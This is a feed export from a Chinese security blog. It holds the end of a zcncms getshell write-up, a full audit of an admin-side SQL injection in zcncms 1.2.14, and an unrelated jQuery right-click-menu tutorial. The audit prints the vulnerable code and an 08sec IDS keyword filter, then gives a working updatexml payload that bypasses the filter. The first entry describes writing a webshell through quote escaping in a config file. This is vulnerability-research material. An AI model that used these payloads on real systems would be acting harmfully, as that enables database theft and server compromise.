<p>将$sys[“closeinfo”]后面的单引号转义，使之和$sys[“webtitle”]的第一个单引号闭合，这样$sys[“webtitle”]的值就摆脱了单引号，再利用注释符”//“注释掉后面的单引号，中间直接可以写shell。执行完成后sys.inc.php如下<br><img src="https://img.alicdn.com/imgextra/i2/792076116/TB2aPrCuXXXXXbtXpXXXXXXXXXX_!!792076116.png" alt=""></p>
<p>成功getshell</p>
<p><img src="https://img.alicdn.com/imgextra/i2/792076116/TB2iFDQuXXXXXXyXpXXXXXXXXXX_!!792076116.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://dassec.b0.upaiyun.com/wps2015/zcncms-bugs.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;接上一篇 &lt;a href=&quot;http://wps2015.org/2016/08/05/code%20audit%20of%20zcncms/&quot;&gt;代码审计——zcncms后台SQL注入(一)&lt;/a&gt;， 继续挖掘出zcncms的几处漏洞.&lt;br&gt;
    
    </summary>
    
      <category term="安全笔记" scheme="http://das.scusec.org/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="PHP" scheme="http://das.scusec.org/tags/PHP/"/>
    
      <category term="wps2015" scheme="http://das.scusec.org/tags/wps2015/"/>
    
  </entry>
  
  <entry>
    <title>代码审计——zcncms后台SQL注入(一)</title>
    <link href="http://das.scusec.org/2016/08/23/code-audit-of-zcncms1/"/>
    <id>http://das.scusec.org/2016/08/23/code-audit-of-zcncms1/</id>
    <published>2016-08-22T16:00:00.000Z</published>
    <updated>2016-08-25T09:09:23.646Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://dassec.b0.upaiyun.com/wps2015/zcncms-sql.jpg" alt=""><br>由于是后台注入，比较鸡肋，发上来供大家相互参考学习。zcncms版本1.2.14，官方网站地址：<br><a href="http://www.zcncms.com/" target="_blank" rel="external">zcncms</a><a id="more"></a></p>
<h2 id="0x00-变量处理"><a href="#0x00-变量处理" class="headerlink" title="0x00 变量处理"></a>0x00 变量处理</h2><p>文件/include/common.inc.php中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//检查和注册外部提交的变量</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$_k</span>=&gt;<span class="variable">$_v</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//if( strlen($_k)&gt;0 &amp;&amp; eregi('^(GLOBALS)',$_k) )</span></span><br><span class="line">	<span class="keyword">if</span>( strlen(<span class="variable">$_k</span>)&gt;<span class="number">0</span> &amp;&amp; preg_match(<span class="string">'/^(GLOBALS)/i'</span>,<span class="variable">$_k</span>) )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">'Request var not allow!'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line"><span class="comment">//foreach(Array('_GET','_POST','_COOKIE') as $_request) 取消cookie自动生成变量</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">Array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>) <span class="keyword">as</span> <span class="variable">$_request</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>) &#123;</span><br><span class="line">		<span class="comment">//------------------20130128校验变量名</span></span><br><span class="line">		<span class="keyword">if</span>(strstr(<span class="variable">$_k</span>, <span class="string">'_'</span>) == <span class="variable">$_k</span>)&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'code:re_all'</span>;</span><br><span class="line">			<span class="keyword">exit</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//可考虑增加变量检测，减少变量覆盖</span></span><br><span class="line">		<span class="comment">//--------------------------</span></span><br><span class="line">		$&#123;<span class="variable">$_k</span>&#125; = _GetRequest(<span class="variable">$_v</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>过滤变量的key是”_p”和”GLOBALS p”的形式，防止全局变量覆盖；并在函数<code>_GetRequest()</code>中进行了addslashes的操作。了解了上面的情况，那么有什么可利用的点就比较清楚了。</p>
<h2 id="0x01-未正确过滤"><a href="#0x01-未正确过滤" class="headerlink" title="0x01 未正确过滤"></a>0x01 未正确过滤</h2><p>文件/module/menus/admincontroller/menus.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'edit'</span>:<span class="comment">//</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$submit</span>))&#123;</span><br><span class="line">    <span class="variable">$info</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$time</span> = time();</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$id</span>))&#123;</span><br><span class="line">      <span class="variable">$id</span> = intval(<span class="variable">$id</span>);</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$id</span> &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">        errorinfo(<span class="string">'变量错误'</span>,<span class="string">''</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="variable">$infoold</span> = <span class="variable">$menus</span>-&gt;GetInfo(<span class="string">''</span>,<span class="string">' id = '</span>.<span class="variable">$id</span>);</span><br><span class="line">      <span class="comment">//改变分类从属判断</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$parentid</span> != <span class="variable">$infoold</span>[<span class="string">'parentid'</span>]) &#123;  <span class="comment">//毫无意义的比较</span></span><br><span class="line">        <span class="variable">$List</span> = <span class="variable">$menus</span>-&gt;GetList(<span class="string">''</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="string">" parentid = $id "</span>,<span class="string">''</span>); <span class="comment">//恰当的id</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$List</span>)) &#123;</span><br><span class="line">          errorinfo(<span class="string">'对不起，该导航('</span>.<span class="variable">$id</span>.<span class="string">')下有子导航'</span>,<span class="string">''</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//分析根分类</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$parentid</span> == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="variable">$rootid</span> = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$parent</span> = <span class="variable">$menus</span>-&gt;GetInfo(<span class="string">''</span>,<span class="string">' id = '</span>.<span class="variable">$parentid</span>); <span class="comment">//没有单引号</span></span><br></pre></td></tr></table></figure></p>
<p>在$parentid != $infoold[‘parentid’]中，用的’!=’，很明显如果我们要控制$parentid的值，这个不等式肯定成立。但是errorinfo会使程序退出，所以这里需要一个在数据库不存在的parentid，使得取出$List为空，从而进入下面的sql操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$parent = $menus-&#62;GetInfo(&#39;&#39;,&#39; id = &#39;.$parentid);</span><br></pre></td></tr></table></figure></p>
<h2 id="0x02-全局过滤（08sec-ids）"><a href="#0x02-全局过滤（08sec-ids）" class="headerlink" title="0x02 全局过滤（08sec ids）"></a>0x02 全局过滤（08sec ids）</h2><p>在进行尝试的时候，发现了sql执行居然还有过滤</p>
<p><img src="https://img.alicdn.com/imgextra/i4/792076116/TB2wu4nuXXXXXXfXXXXXXXXXXXX_!!792076116.png" alt="test"><br>追踪sql语句执行函数，GetInfo()-&gt;Execute()-&gt;option()-&gt;SafeSql()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SafeSql</span><span class="params">(<span class="variable">$db_string</span>,<span class="variable">$querytype</span>=<span class="string">'select'</span>)</span></span>&#123;</span><br><span class="line">		<span class="comment">//var_dump($db_string);</span></span><br><span class="line">		<span class="comment">//完整的SQL检查</span></span><br><span class="line">		<span class="comment">//$pos = '';</span></span><br><span class="line">		<span class="comment">//$old_pos = '';</span></span><br><span class="line">		<span class="variable">$pos</span> = <span class="number">0</span>;</span><br><span class="line">		<span class="variable">$old_pos</span> = <span class="number">0</span>;</span><br><span class="line">		<span class="variable">$clean</span> = <span class="string">''</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$db_string</span>))&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">true</span>)&#123;			</span><br><span class="line">			<span class="variable">$pos</span> = strpos(<span class="variable">$db_string</span>, <span class="string">'\''</span>, <span class="variable">$pos</span> + <span class="number">1</span>);</span><br><span class="line">			<span class="keyword">if</span> (<span class="variable">$pos</span> === <span class="keyword">false</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$clean</span> .= substr(<span class="variable">$db_string</span>, <span class="variable">$old_pos</span>, <span class="variable">$pos</span> - <span class="variable">$old_pos</span>);</span><br><span class="line">			<span class="keyword">while</span> (<span class="keyword">true</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="variable">$pos1</span> = strpos(<span class="variable">$db_string</span>, <span class="string">'\''</span>, <span class="variable">$pos</span> + <span class="number">1</span>);</span><br><span class="line">				<span class="variable">$pos2</span> = strpos(<span class="variable">$db_string</span>, <span class="string">'\\'</span>, <span class="variable">$pos</span> + <span class="number">1</span>);</span><br><span class="line">				<span class="keyword">if</span> (<span class="variable">$pos1</span> === <span class="keyword">false</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">elseif</span> (<span class="variable">$pos2</span> == <span class="keyword">false</span> || <span class="variable">$pos2</span> &gt; <span class="variable">$pos1</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="variable">$pos</span> = <span class="variable">$pos1</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="variable">$pos</span> = <span class="variable">$pos2</span> + <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$clean</span> .= <span class="string">'$s$'</span>;</span><br><span class="line">			<span class="variable">$old_pos</span> = <span class="variable">$pos</span> + <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$clean</span> .= substr(<span class="variable">$db_string</span>, <span class="variable">$old_pos</span>);</span><br><span class="line">		<span class="variable">$clean</span> = trim(strtolower(preg_replace(<span class="keyword">array</span>(<span class="string">'~\s+~s'</span> ), <span class="keyword">array</span>(<span class="string">' '</span>), <span class="variable">$clean</span>)));</span><br><span class="line"></span><br><span class="line">		<span class="comment">//老版本的Mysql并不支持union，常用的程序里也不使用union，但是一些黑客使用它，所以检查它</span></span><br><span class="line">		<span class="keyword">if</span> (strpos(<span class="variable">$clean</span>, <span class="string">'union'</span>) !== <span class="keyword">false</span> &amp;&amp; preg_match(<span class="string">'~(^|[^a-z])union($|[^[a-z])~s'</span>, <span class="variable">$clean</span>) != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$fail</span> = <span class="keyword">true</span>;</span><br><span class="line">			<span class="variable">$error</span>=<span class="string">"union detect"</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//发布版本的程序可能比较少包括--,#这样的注释，但是黑客经常使用它们</span></span><br><span class="line">		<span class="keyword">elseif</span> (strpos(<span class="variable">$clean</span>, <span class="string">'/*'</span>) &gt; <span class="number">2</span> || strpos(<span class="variable">$clean</span>, <span class="string">'--'</span>) !== <span class="keyword">false</span> || strpos(<span class="variable">$clean</span>, <span class="string">'#'</span>) !== <span class="keyword">false</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$fail</span> = <span class="keyword">true</span>;</span><br><span class="line">			<span class="variable">$error</span>=<span class="string">"comment detect"</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//这些函数不会被使用，但是黑客会用它来操作文件，down掉数据库</span></span><br><span class="line">		<span class="keyword">elseif</span> (strpos(<span class="variable">$clean</span>, <span class="string">'sleep'</span>) !== <span class="keyword">false</span> &amp;&amp; preg_match(<span class="string">'~(^|[^a-z])sleep($|[^[a-z])~s'</span>, <span class="variable">$clean</span>) != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$fail</span> = <span class="keyword">true</span>;</span><br><span class="line">			<span class="variable">$error</span>=<span class="string">"slown down detect"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">elseif</span> (strpos(<span class="variable">$clean</span>, <span class="string">'benchmark'</span>) !== <span class="keyword">false</span> &amp;&amp; preg_match(<span class="string">'~(^|[^a-z])benchmark($|[^[a-z])~s'</span>, <span class="variable">$clean</span>) != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$fail</span> = <span class="keyword">true</span>;</span><br><span class="line">			<span class="variable">$error</span>=<span class="string">"slown down detect"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">elseif</span> (strpos(<span class="variable">$clean</span>, <span class="string">'load_file'</span>) !== <span class="keyword">false</span> &amp;&amp; preg_match(<span class="string">'~(^|[^a-z])load_file($|[^[a-z])~s'</span>, <span class="variable">$clean</span>) != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$fail</span> = <span class="keyword">true</span>;</span><br><span class="line">			<span class="variable">$error</span>=<span class="string">"file fun detect"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">elseif</span> (strpos(<span class="variable">$clean</span>, <span class="string">'into outfile'</span>) !== <span class="keyword">false</span> &amp;&amp; preg_match(<span class="string">'~(^|[^a-z])into\s+outfile($|[^[a-z])~s'</span>, <span class="variable">$clean</span>) != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$fail</span> = <span class="keyword">true</span>;</span><br><span class="line">			<span class="variable">$error</span>=<span class="string">"file fun detect"</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//老版本的MYSQL不支持子查询，我们的程序里可能也用得少，但是黑客可以使用它来查询数据库敏感信息</span></span><br><span class="line">		<span class="keyword">elseif</span> (preg_match(<span class="string">'~\([^)]*?select~s'</span>, <span class="variable">$clean</span>) != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$fail</span> = <span class="keyword">true</span>;</span><br><span class="line">			<span class="variable">$error</span>=<span class="string">"sub select detect"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$fail</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//fputs(fopen($log_file,'a+'),"$userIP||$getUrl||$db_string||$error\r\n");</span></span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">"&lt;font size='5' color='red'&gt;Safe Alert: Request Error step 2!&lt;/font&gt;"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$db_string</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>从代码和警告信息来看，是08sec的通用ids无疑，包括dedecms等内置这个这段代码。网上已经有较多的绕过方式。<br>构造payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zcncms/admin/?c=products_class&#38;a=edit&#38;id=1&#10;POST:&#10;submit=&#38;parentid=12=@`\\\&#39;`  and 1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1));#@`\\\&#39;`</span><br></pre></td></tr></table></figure></p>
<p><img src="https://img.alicdn.com/imgextra/i3/792076116/TB27vUOtVXXXXaOXpXXXXXXXXXX_!!792076116.png" alt=""></p>
<h2 id="0x03-多处类似处理不当"><a href="#0x03-多处类似处理不当" class="headerlink" title="0x03 多处类似处理不当"></a>0x03 多处类似处理不当</h2><p>搜索了一下代码，发现多处parentid处理不当，不过都需要后台权限</p>
<p><img src="https://img.alicdn.com/imgextra/i3/792076116/TB2vro2tVXXXXXRXpXXXXXXXXXX_!!792076116.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://dassec.b0.upaiyun.com/wps2015/zcncms-sql.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;由于是后台注入，比较鸡肋，发上来供大家相互参考学习。zcncms版本1.2.14，官方网站地址：&lt;br&gt;&lt;a href=&quot;http://www.zcncms.com/&quot;&gt;zcncms&lt;/a&gt;
    
    </summary>
    
      <category term="安全笔记" scheme="http://das.scusec.org/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="PHP" scheme="http://das.scusec.org/tags/PHP/"/>
    
      <category term="wps2015" scheme="http://das.scusec.org/tags/wps2015/"/>
    
  </entry>
  
  <entry>
    <title>自定义右键菜单学习</title>
    <link href="http://das.scusec.org/2016/07/22/context-menu/"/>
    <id>http://das.scusec.org/2016/07/22/context-menu/</id>
    <published>2016-07-22T04:09:54.000Z</published>
    <updated>2016-08-25T02:01:15.517Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://dassec.b0.upaiyun.com/simin/pic0.png" alt=""></p>
<a id="more"></a>
<h2 id="0x00-【一般思路】"><a href="#0x00-【一般思路】" class="headerlink" title="0x00 【一般思路】"></a>0x00 【一般思路】</h2><p>  严格来讲，右键菜单应该叫上下文菜单，在html5中也新定义了这个contextmenu全局属性。<br>它的语法是这样的：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">p</span> <span class="attribute">contextmenu</span>=<span class="value">"supermenu"</span>&gt;</span>这个段落附加了一个名为 "supermenu" 的上下文菜单。<span class="tag">&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">menu</span> <span class="attribute">id</span>=<span class="value">"supermenu"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">command</span> <span class="attribute">label</span>=<span class="value">"Step 1: Write Tutorial"</span> <span class="attribute">onclick</span>=<span class="value">"doSomething()"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">command</span> <span class="attribute">label</span>=<span class="value">"Step 2: Edit Tutorial"</span> <span class="attribute">onclick</span>=<span class="value">"doSomethingElse()"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">menu</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><code>contextmenu</code> 属性规定元素的上下文菜单。当用户右键点击元素时，会出现上下文菜单。<br><code>contextmenu</code> 属性的值是要打开的<code>&lt;menu&gt;</code>元素的 id。<br>在这里，我注意到浏览器支持问题：<br><img src="http://dassec.b0.upaiyun.com/simin/pic1.png" alt="image"><br>!!!但是!<br><img src="http://dassec.b0.upaiyun.com/simin/pic2.png" alt="image"><br>在Firefox中并没有出现预想中的结果！<br>然后我发现下面这样可以实现：<br><img src="http://dassec.b0.upaiyun.com/simin/pic4.png" alt="image"></p>
<p>所以这里要注意一下，</p>
<blockquote>
<p>①w3cschool上<code>&lt;menu&gt;</code>的子标签用的是<code>&lt;command&gt;</code>，是有问题的；菜鸟教程上用的是<code>&lt;menuitem&gt;</code>,亲测可行。</p>
<p>②w3cschool上没有给<code>&lt;menu&gt;</code>加一个type属性,必须要加上type=”context”才能成功实现。</p>
</blockquote>
<p><img src="http://dassec.b0.upaiyun.com/simin/pic5.png" alt="image"></p>
<p>更细致的关于menu和menuitem实现上下文菜单可以参考博文<a href="https://segmentfault.com/a/1190000002449360" target="_blank" rel="external">《利用HTML 5中的Menu和Menuitem元素快速创建菜单》</a></p>
<p>可能大家也发现了，这个contextmenu属性只能在原有的上下文菜单上添加，而不能对原有的上下文菜单项进行删除等操作，这样是它的局限性。这时，就需要我们自己通过js来模拟右键点击出现上下文菜单。</p>
<p>写过一段时间JS的都知道，我们实现这个上下文菜单大概这个思路：<br>写个ul列表(隐藏掉) -&gt; 监听鼠标右键事件 -&gt; 将ul列表显示出来</p>
<p>但是，实现的时候，还需要注意几个细节，于是我将这个粗糙的思路细化了一下：</p>
<p>(文中js代码都是基于jQuery的)</p>
<h3 id="阻止浏览器默认右键菜单（上下文菜单）"><a href="#阻止浏览器默认右键菜单（上下文菜单）" class="headerlink" title="阻止浏览器默认右键菜单（上下文菜单）"></a>阻止浏览器默认右键菜单（上下文菜单）</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).bind(<span class="string">"contextmenu"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;);</span><br></pre></td></tr></table></figure>
<h3 id="定义一个ul列表"><a href="#定义一个ul列表" class="headerlink" title="定义一个ul列表"></a>定义一个ul列表</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">div</span> <span class="attribute">style</span>=<span class="value">"display:none"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">li</span>&gt;</span>menuitem1<span class="tag">&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">li</span>&gt;</span>menuitem2<span class="tag">&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">li</span>&gt;</span>menuitem3<span class="tag">&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里要注意列表的放置位置，跟上下文菜单作用的区域相关。</p>
<h3 id="监听鼠标右键点击事件"><a href="#监听鼠标右键点击事件" class="headerlink" title="监听鼠标右键点击事件"></a>监听鼠标右键点击事件</h3><p>这里是根据事件对象的button值来判断的，比如mousedown的事件对象：<br><img src="http://dassec.b0.upaiyun.com/simin/pic6.png" alt="image"><br>由于click事件和mousedown事件很像，在这里将两者做一下比较：</p>
<table>
<thead>
<tr>
<th>鼠标事件</th>
<th>button值</th>
<th>事件描述</th>
</tr>
</thead>
<tbody>
<tr>
<td> click</td>
<td>0</td>
<td>单击鼠标左键    </td>
</tr>
<tr>
<td> click</td>
<td>1</td>
<td>单击鼠标中键    </td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td> mousedown</td>
<td>0</td>
<td>鼠标左键被按下  </td>
</tr>
<tr>
<td> mousedown</td>
<td>1</td>
<td>鼠标中键被按下  </td>
</tr>
<tr>
<td> mousedown</td>
<td>2</td>
<td>鼠标右键被按下  </td>
</tr>
</tbody>
</table>
<blockquote>
<p>click事件只会在单击鼠标左键和中键时触发，单击右键时不会触发</p>
</blockquote>
<h3 id="给ul列表定位及显示"><a href="#给ul列表定位及显示" class="headerlink" title="给ul列表定位及显示"></a>给ul列表定位及显示</h3><p>之前我们提到列表的放置位置，就是为了更准确的给它定位。一般上下文菜单是显示在鼠标稍微右下角的地方，所有首先要定位当前鼠标的坐标。</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
<th>兼容性</th>
</tr>
</thead>
<tbody>
<tr>
<td>  clientX、clientY</td>
<td>触发点相对<strong>浏览器可视区域</strong>左上角距离，不随页面滚动而改变</td>
<td>所有浏览器均支持</td>
</tr>
<tr>
<td>pageX、pageY</td>
<td>触发点相对<strong>文档区域</strong>左上角距离，会随着页面滚动而改变</td>
<td>IE6/7/8不支持</td>
</tr>
<tr>
<td>offsetX、offsetY</td>
<td>触发点相对被<strong>触发dom</strong>的左上角距离，不过左上角基准点在不同浏览器中有区别，其中在IE中以内容区左上角为基准点不包括边框，如果触发点在边框上会返回负值，而chrome中以边框左上角为基准点。</td>
<td>IE所有版本，chrome，Safari均完美支持，Firefox不支持</td>
</tr>
<tr>
<td>layerX、layerY</td>
<td>触发点相对被<strong>触发dom</strong>左上角的距离，数值与offsetX/Y相同，这个变量就是<strong>firefox</strong>用来替代offsetX/Y的，基准点为边框左上角，但是有个条件就是，被触发的dom需要设置为position:relative或者position:absolute，否则会返回相对html文档区域左上角的距离</td>
<td>IE6/7/8不支持，opera不支持，IE9/10和Chrome、Safari均支持</td>
</tr>
<tr>
<td>screenX、screenY</td>
<td>触发点相对<strong>显示器屏幕</strong>左上角的距离，不随页面滚动而改变</td>
<td>所有浏览器均支持</td>
</tr>
</tbody>
</table>
<p><img src="http://dassec.b0.upaiyun.com/simin/pic7.png" alt="image"><br>选择给鼠标定位的参数，那么就选择相应的方式给ul列表定位。</p>
<p>个人推荐使用pageX和pageY，因为我们最后给ul列表定位时，会用到<code>position:absolute</code>。绝对定位是相对于 static定位以外的第一个父元素进行定位。如果两者都是body定位的话，不容易出现定位失误。然后再<code>display：block</code>。</p>
<blockquote>
<p>多定义一个事件：鼠标左键点击页面，ul列表<code>display：none</code></p>
</blockquote>
